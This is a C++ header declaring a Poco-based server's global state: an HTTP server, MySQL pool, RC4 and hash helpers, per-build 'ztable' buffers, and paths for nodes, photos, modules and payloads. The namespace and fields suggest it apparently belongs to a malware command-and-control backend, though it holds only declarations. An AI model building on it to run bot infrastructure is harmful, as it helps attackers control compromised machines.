#ifndef __GLOBALS_H_
#define __GLOBALS_H_

#define SYS_ALLOCATOR(sz) HeapAlloc(gHeap, 0, sz)
#define SYS_ALLOCATORZ(sz) HeapAlloc(gHeap, HEAP_ZERO_MEMORY, sz)
#define SYS_DEALLOCATOR(ptr) HeapFree(gHeap, 0, ptr)
#define SYS_REALLOCATOR(ptr, newSz) HeapReAlloc(gHeap, 0, ptr, newSz)

#include "Poco/Buffer.h"
#include "Poco/CountingStream.h"
#include "Poco/MemoryStream.h"
#include "Poco/FileStream.h"
#include "Poco/StringTokenizer.h"
#include "Poco/Timestamp.h"
#include "Poco/DateTimeFormatter.h"
#include "Poco/DateTimeFormat.h"
#include "Poco/Exception.h"
#include "Poco/ThreadPool.h"
#include "Poco/File.h"
#include "Poco/NumberParser.h"
#include "Poco/Stopwatch.h"
#include "Poco/StreamCopier.h"
#include "Poco/Random.h"
#include "Poco/MemoryPool.h"
#include "Poco/URI.h"
#include "Poco/ByteOrder.h"
#include "Poco/DirectoryIterator.h"
#include "Poco/DirectoryWatcher.h"
#include "Poco/Delegate.h"
#include "Poco/Data/SessionPool.h"
#include "Poco/Data/MySQL/Connector.h"
#include "Poco/Net/HTTPServer.h"
#include "Poco/Net/HTTPRequestHandlerFactory.h"
#include "Poco/Net/HTTPServerParams.h"
#include "Poco/Net/ServerSocket.h"
#include "Poco/Net/HTTPServerRequest.h"
#include "Poco/Net/HTTPServerResponse.h"
#include "Poco/Net/HTTPRequestHandler.h"
#include "Poco/Net/PartHandler.h"
#include "Poco/Net/HTMLForm.h"
#include "Poco/Net/HTTPClientSession.h"
#include "Poco/NullStream.h"
#include "Poco/Util/LayeredConfiguration.h"
#include "Poco/Util/ServerApplication.h"
#include "Poco/Util/Option.h"
#include "Poco/Util/OptionSet.h"
#include "Poco/Util/HelpFormatter.h"
#include "Poco/Dynamic/Var.h"
#include "Poco/JSON/Array.h"
#include "Poco/JSON/Object.h"
#include "Poco/JSON/Parser.h"


#include <vector>
#include <algorithm>



namespace zer0ctrl {

typedef Poco::Buffer<Poco::UInt8> ZBuffer;

class Globals
{
public:
    Globals();
    ~Globals();

    void init(Poco::Util::LayeredConfiguration& config);
    
    bool hasZtableWithId(Poco::UInt32 buildId);
    ZBuffer* getZtableForId(Poco::UInt32 buildId);

    static Globals* getInstance();

	static Poco::UInt32 ror(Poco::UInt32 value, int places);
    static void readFile(const std::string& filePath, std::string& data);
    static void saveFile(const std::string& filePath, std::string& data);
	static Poco::UInt32 getHash(const char* pszString);
    static void arc4(Poco::UInt8* buffer, Poco::UInt32 length, const Poco::UInt8* key, Poco::UInt32 keylen);
    static Poco::UInt64 crc64(Poco::UInt64 crc, void* buf, size_t len);


    int _poolMinSize;
    int _poolMaxSize;
    Poco::MemoryPool* _pQueryPool;
    Poco::Data::SessionPool* _pMysqlPool;
	std::string _nodesPath;
	std::string _photosPath;
    std::string _modulesPath;
	std::string _payloadsPath;
    std::map<Poco::UInt32, ZBuffer*> _ztableMap;
    Poco::FastMutex _ztablesMutex;
};

}

#endif // __GLOBALS_H_
